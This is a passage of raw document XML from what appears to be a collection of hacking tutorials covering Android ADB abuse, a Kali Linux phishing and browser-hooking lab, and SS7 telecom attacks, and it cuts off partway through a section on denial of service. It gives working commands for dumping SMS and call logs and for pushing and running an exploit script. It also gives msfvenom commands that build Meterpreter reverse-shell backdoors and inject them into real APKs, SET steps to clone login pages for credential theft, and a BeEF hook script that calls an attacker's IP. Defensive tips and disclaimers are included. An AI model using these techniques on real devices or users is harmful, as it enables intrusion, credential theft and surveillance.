          <text:p text:style-name="P50"><text:span text:style-name="T12">Dump call logs and SMS</text:span>: <text:span text:style-name="T13">adb shell</text:span> and then run <text:span text:style-name="T13">dump_calllog</text:span> and <text:span text:style-name="T13">dump_sms</text:span> .</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P50"><text:span text:style-name="T12">Capture screen</text:span>: <text:span text:style-name="T13">adb shell screencap /sdcard/screen.png</text:span> .</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P50"><text:span text:style-name="T12">Record screen video</text:span>: <text:span text:style-name="T13">adb shell screenrecord /sdcard/demo.mp4</text:span> .</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">System Manipulation</text:span>:</text:p>
      <text:list text:style-name="L9">
        <text:list-item>
          <text:p text:style-name="P51"><text:span text:style-name="T12">Touch the screen</text:span>: <text:span text:style-name="T13">adb shell input touchscreen tap 700 1453</text:span> .</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P51"><text:span text:style-name="T12">Start an Activity</text:span>: <text:span text:style-name="T13">adb shell am start -n com.example.app/com.example.app.MainActivity</text:span> .</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P51"><text:span text:style-name="T12">Force stop an app</text:span>: <text:span text:style-name="T13">adb shell am force-stop com.example.app</text:span> .</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P51"><text:span text:style-name="T12">Uninstall an app</text:span>: <text:span text:style-name="T13">adb uninstall com.example.app</text:span> .</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:soft-page-break/><text:span text:style-name="T12">Payload Deployment &amp; Meterpreter Access</text:span>: Attackers often combine ADB with other tools like Metasploit to establish full, persistent remote access .</text:p>
      <text:list text:style-name="L10">
        <text:list-item>
          <text:p text:style-name="P52"><text:span text:style-name="T12">Upload and execute a script</text:span>: Push a malicious script to the device and run it .</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P44">adb push exploit.sh /data/local/tmp/<text:line-break/>adb shell chmod +x /data/local/tmp/exploit.sh<text:line-break/>adb shell /data/local/tmp/exploit.sh</text:p>
      <text:list text:style-name="L11">
        <text:list-item>
          <text:p text:style-name="P53"><text:span text:style-name="T12">Backdoor Injection</text:span>: Use <text:span text:style-name="T13">msfvenom</text:span> to create a malicious APK and inject it into a legitimate app .</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P44"># Create payload<text:line-break/>msfvenom -p android/meterpreter/reverse_tcp LHOST=&lt;KALI_IP&gt; LPORT=443 -o backdoor.apk<text:line-break/># Inject into an existing APK<text:line-break/>msfvenom -x original.apk -p android/meterpreter/reverse_tcp LHOST=&lt;KALI_IP&gt; LPORT=443 -o infected_app.apk</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">💡 A Recent Critical Exploit: CVE-2026-0073</text:h>
      <text:p text:style-name="Text_20_body">This demonstrates how dangerous ADB can be. In <text:span text:style-name="T12">May 2026</text:span>, a critical vulnerability (CVE-2026-0073) was disclosed that allows <text:span text:style-name="T12">zero-click remote code execution</text:span> on many Android 11+ devices .</text:p>
      <text:list text:style-name="L12">
        <text:list-item>
          <text:p text:style-name="P54"><text:span text:style-name="T12">The Flaw</text:span>: A logic bug in <text:span text:style-name="T13">adbd_tls_verify_cert()</text:span> causes the device to incorrectly authorize a TLS client certificate if there's a type mismatch .</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P54"><text:span text:style-name="T12">The Impact</text:span>: An attacker on the same network can gain a root shell on the Android device <text:span text:style-name="T12">without the user ever seeing a prompt or interacting</text:span> .</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P54"><text:span text:style-name="T12">Proof-of-Concept</text:span>: Multiple public PoC exploits exist, using a simple Python script (<text:span text:style-name="T13">adb_tls_auth_bypass.py</text:span>) to exploit this .</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P54"><text:span text:style-name="T12">Mitigation</text:span>: The vulnerability is patched in the <text:span text:style-name="T12">May 2026 Android Security Bulletin</text:span>. Users should apply this update immediately .</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3" text:outline-level="3" text:is-list-header="true">🛡️ How to Protect Yourself</text:h>
      <text:list text:style-name="L13">
        <text:list-item>
          <text:p text:style-name="P55"><text:span text:style-name="T12">Disable ADB When Not Needed</text:span>: Turn off "USB Debugging" in Developer Options when you are not actively developing. This prevents unauthorized ADB connections .</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P55"><text:span text:style-name="T12">Patch Immediately</text:span>: Apply the May 2026 Android Security Bulletin to fix the critical CVE-2026-0073 vulnerability .</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P55"><text:span text:style-name="T12">Network Safety</text:span>: Do not enable "Wireless debugging" on untrusted networks (like public Wi-Fi) .</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P55"><text:span text:style-name="T12">Lock Screen Security</text:span>: Even with ADB active, Android's lock screen acts as a crucial layer of defense, as recent research shows ADB fuzzing can sometimes find bypasses .</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P55"><text:span text:style-name="T12">Monitor ADB Traffic</text:span>: Advanced users can monitor network traffic for unauthorized ADB connections on port 5555 (or random ports for wireless debugging).</text:p>
        </text:list-item>
      </text:list>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1" text:outline-level="1">🎯 Kali Linux Guide: One-Click Browser Takeover Lab</text:h>
      <text:p text:style-name="Text_20_body">You've heard how a single click can compromise your device. Now, let's get hands-on in a safe lab environment to understand exactly how attackers chain these techniques together. This guide walks you through setting up a complete attack simulation using <text:span text:style-name="T12">BeEF</text:span> and <text:span text:style-name="T12">SET</text:span>, two powerful tools built into Kali Linux.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🛠️ Part 1: Setting Up Your Kali Linux Lab</text:h>
      <text:p text:style-name="Text_20_body">Before you can practice, you need a safe, isolated testing environment. The absolute safest way to do this is by using a <text:span text:style-name="T12">Kali Linux Live USB</text:span> with persistence.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">A. Creating a Bootable Kali Linux USB (Live)</text:h>
      <text:p text:style-name="Text_20_body">This method is non-destructive; it runs Kali from the USB without touching your host machine's hard drive .</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">What You'll Need:</text:span></text:p>
      <text:list text:style-name="L14">
        <text:list-item>
          <text:p text:style-name="P56">A Kali Linux ISO file (download from the official Kali website)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P56">A USB drive (4GB or larger, 8GB+ is recommended for persistence )</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P56">A tool like <text:span text:style-name="T13">dd</text:span> (Linux/macOS) or Rufus/Etcher (Windows)</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Step 1: Identify Your USB Drive</text:span> To avoid overwriting your hard drive, you need to find the correct device path for your USB.</text:p>
      <text:list text:style-name="L15">
        <text:list-item>
          <text:p text:style-name="P57">Open a terminal and run <text:span text:style-name="T13">sudo fdisk -l</text:span> with the USB drive <text:span text:style-name="T14">unplugged</text:span> .</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P57">Plug in your USB drive and run <text:span text:style-name="T13">sudo fdisk -l</text:span> again.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P57">Note the new device that appears, e.g., <text:span text:style-name="T13">/dev/sdb</text:span>. This is your USB drive's path .</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Step 2: Write the ISO to the USB</text:span> Navigate to where you downloaded the Kali ISO and run the <text:span text:style-name="T13">dd</text:span> <text:soft-page-break/>command. This will write the image to your USB drive.</text:p>
      <text:p text:style-name="P44"># Replace /dev/sdX with your USB device path (e.g., /dev/sdb)<text:line-break/>sudo dd if=kali-linux-2026.1-live-amd64.iso of=/dev/sdX conv=fsync bs=4M status=progress</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Warning:</text:span> Using <text:span text:style-name="T13">dd</text:span> is powerful, but <text:span text:style-name="T12">you can easily overwrite your hard drive</text:span> if you choose the wrong path. Triple-check that the <text:span text:style-name="T13">of=/dev/sdX</text:span> part is your USB drive .</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">B. Adding Persistence (Optional but Recommended)</text:h>
      <text:p text:style-name="Text_20_body">Persistence allows you to save your work and settings on the USB drive, making your lab more practical . Tools like Rufus on Windows simplify this process by allowing you to allocate a persistent partition during creation .</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🧪 Part 2: The Attack Lab</text:h>
      <text:p text:style-name="Text_20_body">Now, we'll simulate two primary ways an attacker can gain initial control via a link: <text:span text:style-name="T12">SET for Phishing</text:span> and <text:span text:style-name="T12">BeEF for Browser Hooking</text:span>.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">A. Website Cloning with SET (Social-Engineering Toolkit)</text:h>
      <text:p text:style-name="Text_20_body">This method demonstrates credential harvesting, showing how a fake login page can steal your password.</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Step 1: Start SET</text:span> Open a terminal and run the toolkit:</text:p>
      <text:p text:style-name="P44">sudo setoolkit</text:p>
      <text:p text:style-name="Text_20_body">You need root privileges for the tool to function properly .</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Step 2: Navigate the Menu</text:span> Follow the on-screen prompts to select the specific attack vector:</text:p>
      <text:list text:style-name="L16">
        <text:list-item>
          <text:p text:style-name="P58">Select <text:span text:style-name="T13">1) Social-Engineering Attacks</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P58">Select <text:span text:style-name="T13">2) Website Attack Vectors</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P58">Select <text:span text:style-name="T13">3) Credential Harvester Attack Method</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P58">Select <text:span text:style-name="T13">2) Site Cloner</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Step 3: Configure the Attack</text:span> The tool will now ask for two things:</text:p>
      <text:list text:style-name="L17">
        <text:list-item>
          <text:p text:style-name="P59"><text:span text:style-name="T12">IP address for the POST back:</text:span> This is your Kali machine's IP address (e.g., <text:span text:style-name="T13">192.168.1.100</text:span>). This is where the stolen credentials will be sent .</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P59"><text:span text:style-name="T12">URL to clone:</text:span> Enter the URL of the site you want to mimic (e.g., <text:span text:style-name="T13">https://www.facebook.com</text:span> or <text:span text:style-name="T13">https://login.microsoftonline.com</text:span>) .</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Understanding the Attack:</text:span> SET will create a nearly perfect clone of the target login page . When <text:soft-page-break/>someone enters their credentials on this fake page, SET will capture them and display them in your terminal .</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">B. Browser Hooking with BeEF (Browser Exploitation Framework)</text:h>
      <text:p text:style-name="Text_20_body">This is where the "one-click takeover" magic happens. BeEF allows an attacker to "hook" a browser, gaining a persistent foothold and executing a variety of attacks .</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Step 1: Start BeEF Framework</text:span> From the Kali terminal, you can start BeEF directly:</text:p>
      <text:p text:style-name="P44">sudo beef-xss</text:p>
      <text:p text:style-name="Text_20_body">This starts the BeEF server. You'll be provided with a web UI (usually <text:span text:style-name="T13">http://127.0.0.1:3000/ui/panel</text:span>), with default credentials <text:span text:style-name="T13">beef:beef</text:span> .</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Step 2: Get the Hook Script</text:span> Once BeEF is running, a key piece of JavaScript is generated. It will look like:</text:p>
      <text:p text:style-name="P44">&lt;script src="http://&lt;YOUR_KALI_IP&gt;:3000/hook.js"&gt;&lt;/script&gt;</text:p>
      <text:p text:style-name="Text_20_body">This script is the "hook" .</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Step 3: Create a Malicious Page</text:span> A common way to deliver the hook is through a phishing page or an evil twin access point .</text:p>
      <text:list text:style-name="L18">
        <text:list-item>
          <text:p text:style-name="P60"><text:span text:style-name="T12">Create a simple HTML page</text:span> in your web root (e.g., <text:span text:style-name="T13">/var/www/html/index.html</text:span>).</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P60"><text:span text:style-name="T12">Paste the hook script</text:span> into its <text:span text:style-name="T13">&lt;body&gt;</text:span>.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P60">Wait for a target to visit your page. As soon as they load it, their browser is "hooked" .</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Understanding the Attack:</text:span> Once a browser is hooked, you'll see it appear as a new "zombie" in the BeEF control panel . From here, the fun (and the danger) begins. You can run modules like:</text:p>
      <text:list text:style-name="L19">
        <text:list-item>
          <text:p text:style-name="P61"><text:span text:style-name="T12">Keylogger:</text:span> Captures all keystrokes typed in the hooked browser .</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P61"><text:span text:style-name="T12">Social Engineering:</text:span> Display a fake login prompt (e.g., "Your session expired, please login again").</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P61"><text:span text:style-name="T12">Network Scanner:</text:span> Scan the target's internal network to find other vulnerable machines .</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P61"><text:span text:style-name="T12">Webcam/Device Probes:</text:span> Attempt to access the target's webcam or microphone (will prompt the user for permission).</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P61"><text:span text:style-name="T12">Deploy Payloads:</text:span> In advanced setups, BeEF can be used to force the browser to download and execute a Metasploit payload, giving the attacker full access to the system .</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🛡️ Part 3: Protecting Yourself</text:h>
      <text:p text:style-name="Text_20_body">Understanding the attack is the first step to defending against it. Here are critical protections against these techniques:</text:p>
      <table:table table:name="Table1" table:style-name="Table1">
        <table:table-column table:style-name="Table1.A" table:number-columns-repeated="3"/>
        <table:table-header-rows>
          <text:soft-page-break/>
          <table:table-row>
            <table:table-cell table:style-name="Table1.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T12">Attack Vector</text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T12">How to Protect Yourself</text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.C1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T12">Why It Works</text:span></text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Phishing / Credential Harvesting</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">1. Hover over links</text:span> before clicking. Look for the real URL and check for misspellings. <text:span text:style-name="T12">2. Use a password manager</text:span> that autofills only on the correct domain. <text:span text:style-name="T12">3. Enable MFA</text:span> (Multi-Factor Authentication) .</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.C2" office:value-type="string">
            <text:p text:style-name="P62">If the URL doesn't match the legitimate site, it's a red flag. A password manager won't autofill on a fake site, providing a strong signal something is wrong. MFA will stop the attacker even if they get your password .</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">XSS &amp; Browser Hooking</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">1. Keep your browser updated.</text:span> <text:span text:style-name="T12">2. Use security extensions</text:span> like uBlock Origin (can block malicious scripts). <text:span text:style-name="T12">3. Be very cautious of any link</text:span> that makes you want to take urgent action .</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.C2" office:value-type="string">
            <text:p text:style-name="P62">Drive-by attacks rely on exploiting vulnerabilities in older browsers. An ad-blocker can prevent many initial infection vectors. A skeptical mindset is your last line of defense.</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">✅ Conclusion: Your Attack &amp; Defense Checklist</text:h>
      <text:p text:style-name="Text_20_body">By following this guide, you have set up a legal, self-contained lab to practice the same techniques attackers use. Remember to <text:span text:style-name="T12">only practice on systems you own or have explicit permission to test</text:span> .</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Key Takeaways:</text:span></text:p>
      <text:list text:style-name="L20">
        <text:list-item>
          <text:p text:style-name="P63"><text:span text:style-name="T12">SET</text:span> demonstrates the ease of creating a convincing phishing page.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P63"><text:span text:style-name="T12">BeEF</text:span> shows how a simple link can give an attacker remote control over your browser session.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P63"><text:span text:style-name="T12">Defenses</text:span> like MFA and password managers are essential, regardless of technical skill level.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">Now that you have the lab running, try exploring the modules in BeEF or cloning different websites with SET. It's the safest way to build your defensive instincts.</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"/>
      <text:h text:style-name="Heading_20_1" text:outline-level="1">📡 SS7 HACKING: Complete Technical Guide</text:h>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">⚠️ CRITICAL LEGAL DISCLAIMER</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">This information is for EDUCATIONAL AND DEFENSIVE PURPOSES ONLY.</text:span> SS7 attacks are illegal and can result in severe criminal penalties including imprisonment and heavy fines. Only authorized security researchers and telecom operators may test these vulnerabilities. Unauthorized <text:soft-page-break/>access violates computer fraud laws worldwide .</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🧠 Part 1: What is SS7?</text:h>
      <text:p text:style-name="Text_20_body">SS7 (Signaling System No. 7) is the global protocol that mobile networks use to route calls, SMS messages, and manage roaming between carriers worldwide .</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">The Critical Flaw:</text:span> SS7 was designed in the 1980s when only trusted telecom operators had network access. It contains <text:span text:style-name="T12">fundamental security gaps</text:span> because it assumes everyone connected to SS7 trusts each other - no authentication or verification mechanisms exist .</text:p>
      <text:p text:style-name="P44">┌─────────────────────────────────────────────────────────────────┐<text:line-break/>│ <text:s text:c="19"/>HOW SS7 WORKS (SIMPLIFIED) <text:s text:c="19"/>│<text:line-break/>├─────────────────────────────────────────────────────────────────┤<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>│ <text:s text:c="2"/>Your Phone <text:s text:c="9"/>Your Carrier <text:s text:c="7"/>Foreign Carrier <text:s text:c="7"/>│<text:line-break/>│ <text:s text:c="2"/>┌─────────┐ <text:s text:c="8"/>┌─────────┐ <text:s text:c="8"/>┌─────────┐ <text:s text:c="10"/>│<text:line-break/>│ <text:s text:c="2"/>│ <text:s/>I want │────────▶│ <text:s/>Where <text:s/>│────────▶│ <text:s/>I have │ <text:s text:c="10"/>│<text:line-break/>│ <text:s text:c="2"/>│ <text:s/>to call│ <text:s/>SS7 <text:s text:c="4"/>│ <text:s/>is <text:s text:c="4"/>│ <text:s/>SS7 <text:s text:c="3"/>│ <text:s/>that <text:s text:c="2"/>│ <text:s text:c="10"/>│<text:line-break/>│ <text:s text:c="2"/>│ <text:s/>Bob <text:s text:c="3"/>│ <text:s/>Query <text:s text:c="2"/>│ <text:s/>Bob? <text:s text:c="2"/>│ <text:s/>Query <text:s/>│ <text:s/>user <text:s text:c="2"/>│ <text:s text:c="10"/>│<text:line-break/>│ <text:s text:c="2"/>└─────────┘ <text:s text:c="8"/>└─────────┘ <text:s text:c="8"/>└─────────┘ <text:s text:c="10"/>│<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>│ <text:s text:c="2"/>PROBLEM: Any SS7 message is trusted - no authentication! <text:s text:c="6"/>│<text:line-break/>│ <text:s text:c="2"/>Attackers can send fake queries that carriers accept <text:s text:c="10"/>│<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>└─────────────────────────────────────────────────────────────────┘</text:p>
      <text:p text:style-name="Text_20_body">Unlike the internet where firewalls block malicious packets, SS7 networks operate on trust. Any participant with core network access can send commands that carriers will execute without verification .</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🎯 Part 2: What Hackers Can Do With Just Your Phone Number</text:h>
      <text:p text:style-name="Text_20_body">Using only your phone number, attackers with SS7 access can execute the following attacks :</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">2.1 Real-Time Location Tracking</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">The Attack:</text:span> Attackers send a <text:span text:style-name="T13">provideSubscriberInfo</text:span> or <text:span text:style-name="T13">anyTimeInterrogation</text:span> SS7 message to your carrier, requesting your current location .</text:p>
      <text:p text:style-name="P44">┌─────────────────────────────────────────────────────────────────┐<text:line-break/>│ <text:s text:c="19"/>LOCATION TRACKING ATTACK <text:s text:c="21"/>│<text:line-break/>├─────────────────────────────────────────────────────────────────┤<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>│ <text:s text:c="2"/>Attacker <text:s text:c="27"/>Your Carrier <text:s text:c="14"/>│<text:line-break/>│ <text:s text:c="2"/>┌─────────┐ <text:s text:c="25"/>┌─────────┐ <text:s text:c="13"/>│<text:line-break/>│ <text:s text:c="2"/>│ "Where <text:s/>│──── SS7 Request ────────▶│ "I need │ <text:s text:c="13"/>│<text:line-break/>│ <text:s text:c="2"/>│ is <text:s text:c="5"/>│ <text:s text:c="2"/>(anyTimeInterrogation) │ location│ <text:s text:c="13"/>│<text:line-break/>│ <text:s text:c="2"/>│ +123456 │ <text:s text:c="25"/>│ for this│ <text:s text:c="13"/>│<text:line-break/>│ <text:s text:c="2"/>│ 7890?" <text:s/>│ <text:s text:c="25"/>│ user" <text:s text:c="2"/>│ <text:s text:c="13"/>│<text:line-break/>│ <text:s text:c="2"/>└─────────┘ <text:s text:c="25"/>└─────────┘ <text:s text:c="13"/>│<text:line-break/>│ <text:s text:c="7"/>▲ <text:s text:c="34"/>│ <text:s text:c="19"/>│<text:line-break/>│ <text:s text:c="7"/>│ <text:s text:c="34"/>▼ <text:s text:c="19"/>│<text:line-break/>│ <text:s text:c="7"/>│ <text:s text:c="27"/>┌─────────┐ <text:s text:c="16"/>│<text:line-break/><text:soft-page-break/>│ <text:s text:c="7"/>│◀─── Response (Location) ────│ Carrier │ <text:s text:c="16"/>│<text:line-break/>│ <text:s text:c="7"/>│ <text:s text:c="4"/>"MSC ID: Tower 247" <text:s text:c="4"/>│ replies │ <text:s text:c="16"/>│<text:line-break/>│ <text:s text:c="7"/>│ <text:s text:c="27"/>└─────────┘ <text:s text:c="17"/>│<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>│ <text:s text:c="2"/>RESULT: Attacker knows your location within meters <text:s text:c="12"/>│<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>└─────────────────────────────────────────────────────────────────┘</text:p>
      <text:p text:style-name="Text_20_body">The attacker receives the MSC (Mobile Switching Center) identifier, which can be mapped to a physical location - often accurate within a few city blocks or meters .</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">2.2 Call Interception</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">The Attack:</text:span> Attackers use SS7 to route your calls through their own systems before they reach you or the intended recipient .</text:p>
      <text:p text:style-name="P44">┌─────────────────────────────────────────────────────────────────┐<text:line-break/>│ <text:s text:c="20"/>CALL INTERCEPTION ATTACK <text:s text:c="20"/>│<text:line-break/>├─────────────────────────────────────────────────────────────────┤<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>│ <text:s text:c="2"/>Normal Flow: <text:s text:c="50"/>│<text:line-break/>│ <text:s text:c="2"/>Caller ─────────────────────────────────────────▶ Recipient <text:s text:c="2"/>│<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>│ <text:s text:c="2"/>Intercepted Flow: <text:s text:c="45"/>│<text:line-break/>│ <text:s text:c="2"/>Caller ───▶ Attacker's System ───▶ Recipient <text:s text:c="17"/>│<text:line-break/>│ <text:s text:c="18"/>│ <text:s text:c="45"/>│<text:line-break/>│ <text:s text:c="18"/>▼ <text:s text:c="45"/>│<text:line-break/>│ <text:s text:c="13"/>Records call (MITM) <text:s text:c="31"/>│<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>│ <text:s text:c="2"/>How: "Update Location" (UL) message tricks carrier into <text:s text:c="6"/>│<text:line-break/>│ <text:s text:c="2"/>thinking the victim is roaming on attacker's network <text:s text:c="9"/>│<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>└─────────────────────────────────────────────────────────────────┘</text:p>
      <text:p text:style-name="Text_20_body">Using the "Update Location" (UL) SS7 message, attackers can trick your carrier into believing your phone is roaming on their network, routing all your communications through their systems .</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">2.3 SMS Interception (Including 2FA Codes)</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">The Attack:</text:span> Attackers intercept SMS messages - including one-time passwords (OTPs) for banking, email, and other services .</text:p>
      <text:p text:style-name="P44">┌─────────────────────────────────────────────────────────────────┐<text:line-break/>│ <text:s text:c="21"/>SMS INTERCEPTION ATTACK <text:s text:c="20"/>│<text:line-break/>├─────────────────────────────────────────────────────────────────┤<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>│ <text:s text:c="2"/>Bank ───▶ "Your OTP: 123456" ───▶ Your Carrier <text:s text:c="15"/>│<text:line-break/>│ <text:s text:c="42"/>│ <text:s text:c="21"/>│<text:line-break/>│ <text:s text:c="42"/>▼ <text:s text:c="21"/>│<text:line-break/>│ <text:s text:c="35"/>┌─────────────┐ <text:s text:c="13"/>│<text:line-break/>│ <text:s text:c="35"/>│ <text:s/>Attacker <text:s text:c="2"/>│ <text:s text:c="13"/>│<text:line-break/>│ <text:s text:c="35"/>│ <text:s/>intercepts │ <text:s text:c="13"/>│<text:line-break/>│ <text:s text:c="35"/>│ <text:s/>the SMS <text:s text:c="3"/>│ <text:s text:c="13"/>│<text:line-break/>│ <text:s text:c="35"/>└─────────────┘ <text:s text:c="13"/>│<text:line-break/>│ <text:s text:c="42"/>│ <text:s text:c="21"/>│<text:line-break/>│ <text:s text:c="42"/>▼ <text:s text:c="21"/>│<text:line-break/><text:soft-page-break/>│ <text:s text:c="35"/>Your Phone never <text:s text:c="13"/>│<text:line-break/>│ <text:s text:c="35"/>receives the SMS <text:s text:c="13"/>│<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>│ <text:s text:c="2"/>RESULT: Attacker can bypass SMS-based 2FA and access <text:s text:c="9"/>│<text:line-break/>│ <text:s text:c="2"/>your bank account, email, or any account using SMS 2FA <text:s text:c="7"/>│<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>└─────────────────────────────────────────────────────────────────┘</text:p>
      <text:p text:style-name="Text_20_body">Using the <text:span text:style-name="T13">sendRoutingInfoForSM</text:span> and <text:span text:style-name="T13">forwardSM</text:span> SS7 messages, attackers can redirect your SMS messages to their own systems .</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">2.4 Call Redirection</text:h>
      <text:p text:style-name="Text_20_body">Attackers can forward your calls to any number they control without your knowledge or consent .</text:p>
      <text:p text:style-name="P44">┌─────────────────────────────────────────────────────────────────┐<text:line-break/>│ <text:s text:c="20"/>CALL REDIRECTION ATTACK <text:s text:c="21"/>│<text:line-break/>├─────────────────────────────────────────────────────────────────┤<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>│ <text:s text:c="2"/>Someone calls you: +1234567890 <text:s text:c="31"/>│<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>│ <text:s text:c="2"/>Instead of ringing your phone... <text:s text:c="29"/>│<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>│ <text:s text:c="2"/>Attacker uses SS7 to send "Call Forwarding" command <text:s text:c="10"/>│<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>│ <text:s text:c="2"/>Your call goes to: +9999999999 (attacker's number) <text:s text:c="11"/>│<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>│ <text:s text:c="2"/>RESULT: Attacker receives all your calls <text:s text:c="22"/>│<text:line-break/>│ <text:s text:c="65"/>│<text:line-break/>└─────────────────────────────────────────────────────────────────┘</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">2.5 Denial of Service (DoS)</text:h>
